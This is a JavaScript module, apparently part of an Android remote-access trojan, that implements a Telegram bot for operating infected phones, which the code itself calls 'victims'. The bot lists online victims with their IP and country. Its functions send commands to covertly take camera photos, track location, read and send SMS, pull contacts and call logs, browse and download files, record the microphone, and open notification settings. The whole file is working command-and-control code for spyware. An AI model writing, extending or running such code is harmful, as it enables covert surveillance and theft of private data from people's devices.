const axios = require('axios');
const main = require('../index');

const API_URL = process.env.API_URL || 'http://localhost:3000/api';

// List Online Victims
exports.listOnlineVictims = async (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    try {
      const response = await axios.get(`${API_URL}/victims`, {
        params: { telegram_id: chatId }
      });

      if (!response.data.success || response.data.victims.length === 0) {
        return main.bot.sendMessage(chatId, "📵 Tidak ada device yang online saat ini.");
      }

      const victims = response.data.victims;
      let message = `📱 *Device Online (${victims.length})*\n\n`;

      // Get device names from database
      const deviceIds = victims.map(v => v.id);
      const placeholders = deviceIds.map(() => '?').join(',');
      
      main.db.query(
        `SELECT device_id, device_name FROM devices WHERE device_id IN (${placeholders})`,
        deviceIds,
        (err, deviceNames) => {
          if (err) {
            console.error(err);
            deviceNames = [];
          }

          const nameMap = {};
          deviceNames.forEach(d => {
            nameMap[d.device_id] = d.device_name;
          });

          victims.forEach((victim, index) => {
            const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
            message += `${index + 1}. *${deviceName}*\n`;
            message += `   ID: \`${victim.id}\`\n`;
            message += `   IP: ${victim.ip}\n`;
            message += `   Device: ${victim.manufacturer} ${victim.model}\n`;
            message += `   Country: ${victim.country || 'Unknown'}\n\n`;
          });

          message += '\n🎮 *Control Commands:*\n';
          message += '/camera - Ambil foto\n';
          message += '/location - Dapatkan lokasi\n';
          message += '/sms - Kelola SMS\n';
          message += '/contacts - Lihat kontak\n';
          message += '/calls - Lihat riwayat panggilan\n';
          message += '/files - Kelola file\n';
          message += '/mic - Record audio\n';
          message += '/notif - Kelola notifikasi';

          main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
        }
      );

    } catch (error) {
      console.error('Error fetching victims:', error);
      main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
    }
  });
};

// Camera Control
exports.cameraControl = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    try {
      const response = await axios.get(`${API_URL}/victims`, {
        params: { telegram_id: chatId }
      });

      if (!response.data.success || response.data.victims.length === 0) {
        return main.bot.sendMessage(chatId, "📵 Tidak ada device yang online.");
      }

      const victims = response.data.victims;
      const deviceIds = victims.map(v => v.id);
      
      main.db.query(
        `SELECT device_id, device_name FROM devices WHERE device_id IN (${deviceIds.map(() => '?').join(',')})`,
        deviceIds,
        (err, deviceNames) => {
          const nameMap = {};
          (deviceNames || []).forEach(d => {
            nameMap[d.device_id] = d.device_name;
          });

          let message = "📸 *Pilih device untuk ambil foto:*\n\n";
          victims.forEach((victim, index) => {
            const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
            message += `${index + 1}. ${deviceName}\n`;
            message += `   ID: \`${victim.id}\`\n\n`;
          });
          message += '\nBalas dengan device_id';

          main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

          main.bot.once('message', async (response) => {
            const deviceId = response.text.trim();

            try {
              await axios.post(`${API_URL}/victims/${deviceId}/camera`, {
                telegram_id: chatId,
                cameraId: 0
              });

              const deviceName = nameMap[deviceId] || deviceId;
              main.bot.sendMessage(chatId, `
✅ *Perintah foto berhasil dikirim!*

Device: *${deviceName}*
ID: \`${deviceId}\`

📷 Foto akan segera diambil dari device.
Tunggu beberapa saat untuk hasil.
              `, { parse_mode: "Markdown" });

            } catch (error) {
              console.error('Error sending camera command:', error);
              main.bot.sendMessage(chatId, "❌ Gagal mengirim perintah foto.");
            }
          });
        }
      );

    } catch (error) {
      console.error('Error fetching victims:', error);
      main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
    }
  });
};

// Location Control
exports.locationControl = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    try {
      const response = await axios.get(`${API_URL}/victims`, {
        params: { telegram_id: chatId }
      });

      if (!response.data.success || response.data.victims.length === 0) {
        return main.bot.sendMessage(chatId, "📵 Tidak ada device yang online.");
      }

      const victims = response.data.victims;
      const deviceIds = victims.map(v => v.id);
      
      main.db.query(
        `SELECT device_id, device_name FROM devices WHERE device_id IN (${deviceIds.map(() => '?').join(',')})`,
        deviceIds,
        (err, deviceNames) => {
          const nameMap = {};
          (deviceNames || []).forEach(d => {
            nameMap[d.device_id] = d.device_name;
          });

          let message = "📍 *Pilih device untuk dapatkan lokasi:*\n\n";
          victims.forEach((victim, index) => {
            const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
            message += `${index + 1}. ${deviceName}\n`;
            message += `   ID: \`${victim.id}\`\n\n`;
          });
          message += '\nBalas dengan device_id';

          main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

          main.bot.once('message', async (response) => {
            const deviceId = response.text.trim();

            try {
              await axios.post(`${API_URL}/victims/${deviceId}/location`, {
                telegram_id: chatId
              });

              const deviceName = nameMap[deviceId] || deviceId;
              main.bot.sendMessage(chatId, `
✅ *Perintah lokasi berhasil dikirim!*

Device: *${deviceName}*
ID: \`${deviceId}\`

📍 Lokasi akan segera didapatkan.
Tunggu beberapa saat untuk hasil.
              `, { parse_mode: "Markdown" });

            } catch (error) {
              console.error('Error sending location command:', error);
              main.bot.sendMessage(chatId, "❌ Gagal mengirim perintah lokasi.");
            }
          });
        }
      );

    } catch (error) {
      console.error('Error fetching victims:', error);
      main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
    }
  });
};

// SMS Control
exports.smsControl = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "📥 Lihat SMS", callback_data: "sms_list" },
            { text: "📤 Kirim SMS", callback_data: "sms_send" }
          ]
        ]
      }
    };

    main.bot.sendMessage(chatId, "📨 *SMS Manager*\n\nPilih aksi:", { 
      parse_mode: "Markdown",
      ...keyboard 
    });
  });
};

// Contacts Control
exports.contactsControl = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    try {
      const response = await axios.get(`${API_URL}/victims`, {
        params: { telegram_id: chatId }
      });

      if (!response.data.success || response.data.victims.length === 0) {
        return main.bot.sendMessage(chatId, "📵 Tidak ada device yang online.");
      }

      const victims = response.data.victims;
      const deviceIds = victims.map(v => v.id);
      
      main.db.query(
        `SELECT device_id, device_name FROM devices WHERE device_id IN (${deviceIds.map(() => '?').join(',')})`,
        deviceIds,
        (err, deviceNames) => {
          const nameMap = {};
          (deviceNames || []).forEach(d => {
            nameMap[d.device_id] = d.device_name;
          });

          let message = "📇 *Pilih device untuk lihat kontak:*\n\n";
          victims.forEach((victim, index) => {
            const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
            message += `${index + 1}. ${deviceName}\n`;
            message += `   ID: \`${victim.id}\`\n\n`;
          });
          message += '\nBalas dengan device_id';

          main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

          main.bot.once('message', async (response) => {
            const deviceId = response.text.trim();

            try {
              await axios.post(`${API_URL}/victims/${deviceId}/contacts`, {
                telegram_id: chatId
              });

              const deviceName = nameMap[deviceId] || deviceId;
              main.bot.sendMessage(chatId, `
✅ *Perintah kontak berhasil dikirim!*

Device: *${deviceName}*
ID: \`${deviceId}\`

📇 Daftar kontak akan segera didapatkan.
Tunggu beberapa saat untuk hasil.
              `, { parse_mode: "Markdown" });

            } catch (error) {
              console.error('Error sending contacts command:', error);
              main.bot.sendMessage(chatId, "❌ Gagal mengirim perintah kontak.");
            }
          });
        }
      );

    } catch (error) {
      console.error('Error fetching victims:', error);
      main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
    }
  });
};

// Calls Control
exports.callsControl = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    try {
      const response = await axios.get(`${API_URL}/victims`, {
        params: { telegram_id: chatId }
      });

      if (!response.data.success || response.data.victims.length === 0) {
        return main.bot.sendMessage(chatId, "📵 Tidak ada device yang online.");
      }

      const victims = response.data.victims;
      const deviceIds = victims.map(v => v.id);
      
      main.db.query(
        `SELECT device_id, device_name FROM devices WHERE device_id IN (${deviceIds.map(() => '?').join(',')})`,
        deviceIds,
        (err, deviceNames) => {
          const nameMap = {};
          (deviceNames || []).forEach(d => {
            nameMap[d.device_id] = d.device_name;
          });

          let message = "📞 *Pilih device untuk lihat riwayat panggilan:*\n\n";
          victims.forEach((victim, index) => {
            const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
            message += `${index + 1}. ${deviceName}\n`;
            message += `   ID: \`${victim.id}\`\n\n`;
          });
          message += '\nBalas dengan device_id';

          main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

          main.bot.once('message', async (response) => {
            const deviceId = response.text.trim();

            try {
              await axios.post(`${API_URL}/victims/${deviceId}/calls`, {
                telegram_id: chatId
              });

              const deviceName = nameMap[deviceId] || deviceId;
              main.bot.sendMessage(chatId, `
✅ *Perintah riwayat panggilan berhasil dikirim!*

Device: *${deviceName}*
ID: \`${deviceId}\`

📞 Riwayat panggilan akan segera didapatkan.
Tunggu beberapa saat untuk hasil.
              `, { parse_mode: "Markdown" });

            } catch (error) {
              console.error('Error sending calls command:', error);
              main.bot.sendMessage(chatId, "❌ Gagal mengirim perintah riwayat panggilan.");
            }
          });
        }
      );

    } catch (error) {
      console.error('Error fetching victims:', error);
      main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
    }
  });
};

// Files Control
exports.filesControl = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "📂 Lihat File", callback_data: "files_list" },
            { text: "⬇️ Download File", callback_data: "files_download" }
          ]
        ]
      }
    };

    main.bot.sendMessage(chatId, "📁 *File Manager*\n\nPilih aksi:", { 
      parse_mode: "Markdown",
      ...keyboard 
    });
  });
};

// Microphone Control
exports.micControl = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    try {
      const response = await axios.get(`${API_URL}/victims`, {
        params: { telegram_id: chatId }
      });

      if (!response.data.success || response.data.victims.length === 0) {
        return main.bot.sendMessage(chatId, "📵 Tidak ada device yang online.");
      }

      const victims = response.data.victims;
      const deviceIds = victims.map(v => v.id);
      
      main.db.query(
        `SELECT device_id, device_name FROM devices WHERE device_id IN (${deviceIds.map(() => '?').join(',')})`,
        deviceIds,
        (err, deviceNames) => {
          const nameMap = {};
          (deviceNames || []).forEach(d => {
            nameMap[d.device_id] = d.device_name;
          });

          let message = "🎤 *Pilih device untuk record audio:*\n\n";
          victims.forEach((victim, index) => {
            const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
            message += `${index + 1}. ${deviceName}\n`;
            message += `   ID: \`${victim.id}\`\n\n`;
          });
          message += '\nBalas dengan format:\ndevice_id,durasi_detik\n\nContoh: abc123,10';

          main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

          main.bot.once('message', async (response) => {
            const text = response.text.trim();
            const parts = text.split(',');

            if (parts.length !== 2) {
              return main.bot.sendMessage(chatId, "Format salah! Gunakan: device_id,durasi_detik");
            }

            const [deviceId, duration] = parts.map(p => p.trim());

            try {
              await axios.post(`${API_URL}/victims/${deviceId}/microphone`, {
                telegram_id: chatId,
                duration: parseInt(duration)
              });

              const deviceName = nameMap[deviceId] || deviceId;
              main.bot.sendMessage(chatId, `
✅ *Perintah record audio berhasil dikirim!*

Device: *${deviceName}*
ID: \`${deviceId}\`
Durasi: ${duration} detik

🎤 Recording akan segera dimulai.
Tunggu beberapa saat untuk hasil.
              `, { parse_mode: "Markdown" });

            } catch (error) {
              console.error('Error sending mic command:', error);
              main.bot.sendMessage(chatId, "❌ Gagal mengirim perintah record audio.");
            }
          });
        }
      );

    } catch (error) {
      console.error('Error fetching victims:', error);
      main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
    }
  });
};

// Notification Control
exports.notificationControl = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    try {
      const response = await axios.get(`${API_URL}/victims`, {
        params: { telegram_id: chatId }
      });

      if (!response.data.success || response.data.victims.length === 0) {
        return main.bot.sendMessage(chatId, "📵 Tidak ada device yang online.");
      }

      const victims = response.data.victims;
      const deviceIds = victims.map(v => v.id);
      
      main.db.query(
        `SELECT device_id, device_name FROM devices WHERE device_id IN (${deviceIds.map(() => '?').join(',')})`,
        deviceIds,
        (err, deviceNames) => {
          const nameMap = {};
          (deviceNames || []).forEach(d => {
            nameMap[d.device_id] = d.device_name;
          });

          let message = "🔔 *Pilih device untuk kelola notifikasi:*\n\n";
          victims.forEach((victim, index) => {
            const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
            message += `${index + 1}. ${deviceName}\n`;
            message += `   ID: \`${victim.id}\`\n\n`;
          });
          message += '\nBalas dengan device_id';

          main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

          main.bot.once('message', async (response) => {
            const deviceId = response.text.trim();
            const deviceName = nameMap[deviceId] || deviceId;

            const keyboard = {
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: "✅ Check Status", callback_data: `notif_status_${deviceId}` },
                  ],
                  [
                    { text: "⚙️ Open Settings", callback_data: `notif_settings_${deviceId}` }
                  ]
                ]
              }
            };

            main.bot.sendMessage(chatId, `
🔔 *Notification Manager*

Device: *${deviceName}*
ID: \`${deviceId}\`

Pilih aksi:
            `, { 
              parse_mode: "Markdown",
              ...keyboard 
            });
          });
        }
      );

    } catch (error) {
      console.error('Error fetching victims:', error);
      main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
    }
  });
};

// Handle Callback Queries for Device Control
exports.handleDeviceCallback = async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    // SMS Callbacks
    if (data === 'sms_list') {
      try {
        const response = await axios.get(`${API_URL}/victims`, {
          params: { telegram_id: chatId }
        });

        if (!response.data.success || response.data.victims.length === 0) {
          return main.bot.sendMessage(chatId, "📵 Tidak ada device yang online.");
        }

        const victims = response.data.victims;
        const deviceIds = victims.map(v => v.id);
        
        main.db.query(
          `SELECT device_id, device_name FROM devices WHERE device_id IN (${deviceIds.map(() => '?').join(',')})`,
          deviceIds,
          (err, deviceNames) => {
            const nameMap = {};
            (deviceNames || []).forEach(d => {
              nameMap[d.device_id] = d.device_name;
            });

            let message = "📥 *Pilih device untuk lihat SMS:*\n\n";
            victims.forEach((victim, index) => {
              const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
              message += `${index + 1}. ${deviceName}\n`;
              message += `   ID: \`${victim.id}\`\n\n`;
            });
            message += '\nBalas dengan device_id';

            main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

            main.bot.once('message', async (response) => {
              const deviceId = response.text.trim();

              try {
                await axios.post(`${API_URL}/victims/${deviceId}/sms/list`, {
                  telegram_id: chatId
                });

                const deviceName = nameMap[deviceId] || deviceId;
                main.bot.sendMessage(chatId, `
✅ *Perintah lihat SMS berhasil dikirim!*

Device: *${deviceName}*
ID: \`${deviceId}\`

📥 Daftar SMS akan segera didapatkan.
Tunggu beberapa saat untuk hasil.
                `, { parse_mode: "Markdown" });

              } catch (error) {
                console.error('Error sending SMS list command:', error);
                main.bot.sendMessage(chatId, "❌ Gagal mengirim perintah.");
              }
            });
          }
        );

      } catch (error) {
        console.error('Error fetching victims:', error);
        main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
      }
    }

    // SMS Send
    else if (data === 'sms_send') {
      try {
        const response = await axios.get(`${API_URL}/victims`, {
          params: { telegram_id: chatId }
        });

        if (!response.data.success || response.data.victims.length === 0) {
          return main.bot.sendMessage(chatId, "📵 Tidak ada device yang online.");
        }

        const victims = response.data.victims;
        const deviceIds = victims.map(v => v.id);
        
        main.db.query(
          `SELECT device_id, device_name FROM devices WHERE device_id IN (${deviceIds.map(() => '?').join(',')})`,
          deviceIds,
          (err, deviceNames) => {
            const nameMap = {};
            (deviceNames || []).forEach(d => {
              nameMap[d.device_id] = d.device_name;
            });

            let message = "📤 *Pilih device untuk kirim SMS:*\n\n";
            victims.forEach((victim, index) => {
              const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
              message += `${index + 1}. ${deviceName}\n`;
              message += `   ID: \`${victim.id}\`\n\n`;
            });
            message += '\nBalas dengan format:\ndevice_id,nomor_tujuan,pesan\n\nContoh:\nabc123,08123456789,Halo dari bot';

            main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

            main.bot.once('message', async (response) => {
              const text = response.text.trim();
              const parts = text.split(',');

              if (parts.length < 3) {
                return main.bot.sendMessage(chatId, "Format salah! Gunakan: device_id,nomor,pesan");
              }

              const deviceId = parts[0].trim();
              const phoneNumber = parts[1].trim();
              const smsMessage = parts.slice(2).join(',').trim();

              try {
                await axios.post(`${API_URL}/victims/${deviceId}/sms/send`, {
                  telegram_id: chatId,
                  to: phoneNumber,
                  message: smsMessage
                });

                const deviceName = nameMap[deviceId] || deviceId;
                main.bot.sendMessage(chatId, `
✅ *SMS berhasil dikirim!*

Device: *${deviceName}*
ID: \`${deviceId}\`
Tujuan: ${phoneNumber}
Pesan: ${smsMessage}
                `, { parse_mode: "Markdown" });

              } catch (error) {
                console.error('Error sending SMS:', error);
                main.bot.sendMessage(chatId, "❌ Gagal mengirim SMS.");
              }
            });
          }
        );

      } catch (error) {
        console.error('Error fetching victims:', error);
        main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
      }
    }

    // Files List
    else if (data === 'files_list') {
      try {
        const response = await axios.get(`${API_URL}/victims`, {
          params: { telegram_id: chatId }
        });

        if (!response.data.success || response.data.victims.length === 0) {
          return main.bot.sendMessage(chatId, "📵 Tidak ada device yang online.");
        }

        const victims = response.data.victims;
        const deviceIds = victims.map(v => v.id);
        
        main.db.query(
          `SELECT device_id, device_name FROM devices WHERE device_id IN (${deviceIds.map(() => '?').join(',')})`,
          deviceIds,
          (err, deviceNames) => {
            const nameMap = {};
            (deviceNames || []).forEach(d => {
              nameMap[d.device_id] = d.device_name;
            });

            let message = "📂 *Pilih device untuk lihat file:*\n\n";
            victims.forEach((victim, index) => {
              const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
              message += `${index + 1}. ${deviceName}\n`;
              message += `   ID: \`${victim.id}\`\n\n`;
            });
            message += '\nBalas dengan format:\ndevice_id,path\n\nContoh:\nabc123,/storage/emulated/0/';

            main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

            main.bot.once('message', async (response) => {
              const text = response.text.trim();
              const parts = text.split(',');

              const deviceId = parts[0].trim();
              const filePath = parts[1] ? parts[1].trim() : '/storage/emulated/0/';

              try {
                await axios.post(`${API_URL}/victims/${deviceId}/files/list`, {
                  telegram_id: chatId,
                  path: filePath
                });

                const deviceName = nameMap[deviceId] || deviceId;
                main.bot.sendMessage(chatId, `
✅ *Perintah lihat file berhasil dikirim!*

Device: *${deviceName}*
ID: \`${deviceId}\`
Path: ${filePath}

📂 Daftar file akan segera didapatkan.
Tunggu beberapa saat untuk hasil.
                `, { parse_mode: "Markdown" });

              } catch (error) {
                console.error('Error sending files list command:', error);
                main.bot.sendMessage(chatId, "❌ Gagal mengirim perintah.");
              }
            });
          }
        );

      } catch (error) {
        console.error('Error fetching victims:', error);
        main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
      }
    }

    // Files Download
    else if (data === 'files_download') {
      try {
        const response = await axios.get(`${API_URL}/victims`, {
          params: { telegram_id: chatId }
        });

        if (!response.data.success || response.data.victims.length === 0) {
          return main.bot.sendMessage(chatId, "📵 Tidak ada device yang online.");
        }

        const victims = response.data.victims;
        const deviceIds = victims.map(v => v.id);
        
        main.db.query(
          `SELECT device_id, device_name FROM devices WHERE device_id IN (${deviceIds.map(() => '?').join(',')})`,
          deviceIds,
          (err, deviceNames) => {
            const nameMap = {};
            (deviceNames || []).forEach(d => {
              nameMap[d.device_id] = d.device_name;
            });

            let message = "⬇️ *Pilih device untuk download file:*\n\n";
            victims.forEach((victim, index) => {
              const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
              message += `${index + 1}. ${deviceName}\n`;
              message += `   ID: \`${victim.id}\`\n\n`;
            });
            message += '\nBalas dengan format:\ndevice_id,full_file_path\n\nContoh:\nabc123,/storage/emulated/0/Download/photo.jpg';

            main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

            main.bot.once('message', async (response) => {
              const text = response.text.trim();
              const parts = text.split(',');

              if (parts.length !== 2) {
                return main.bot.sendMessage(chatId, "Format salah! Gunakan: device_id,full_path");
              }

              const deviceId = parts[0].trim();
              const filePath = parts[1].trim();

              try {
                await axios.post(`${API_URL}/victims/${deviceId}/files/download`, {
                  telegram_id: chatId,
                  path: filePath
                });

                const deviceName = nameMap[deviceId] || deviceId;
                main.bot.sendMessage(chatId, `
✅ *Perintah download file berhasil dikirim!*

Device: *${deviceName}*
ID: \`${deviceId}\`
File: ${filePath}

⬇️ File akan segera didownload.
Tunggu beberapa saat untuk hasil.
                `, { parse_mode: "Markdown" });

              } catch (error) {
                console.error('Error sending download command:', error);
                main.bot.sendMessage(chatId, "❌ Gagal mengirim perintah download.");
              }
            });
          }
        );

      } catch (error) {
        console.error('Error fetching victims:', error);
        main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
      }
    }

    // Notification Status
    else if (data.startsWith('notif_status_')) {
      const deviceId = data.replace('notif_status_', '');
      
      try {
        await axios.post(`${API_URL}/victims/${deviceId}/command`, {
          telegram_id: chatId,
          order: 'x0000nf',
          extra: 'status'
        });

        main.bot.sendMessage(chatId, `
✅ *Checking notification status...*

Device ID: \`${deviceId}\`

🔔 Status akan segera didapatkan.
        `, { parse_mode: "Markdown" });

      } catch (error) {
        console.error('Error checking notification status:', error);
        main.bot.sendMessage(chatId, "❌ Gagal cek status notifikasi.");
      }
    }

    // Notification Settings
    else if (data.startsWith('notif_settings_')) {
      const deviceId = data.replace('notif_settings_', '');
      
      try {
        await axios.post(`${API_URL}/victims/${deviceId}/command`, {
          telegram_id: chatId,
          order: 'x0000nf',
          extra: 'openSettings'
        });

        main.bot.sendMessage(chatId, `
✅ *Opening notification settings...*

Device ID: \`${deviceId}\`

⚙️ Settings akan terbuka di device.
        `, { parse_mode: "Markdown" });

      } catch (error) {
        console.error('Error opening notification settings:', error);
        main.bot.sendMessage(chatId, "❌ Gagal membuka settings.");
      }
    }
  });
};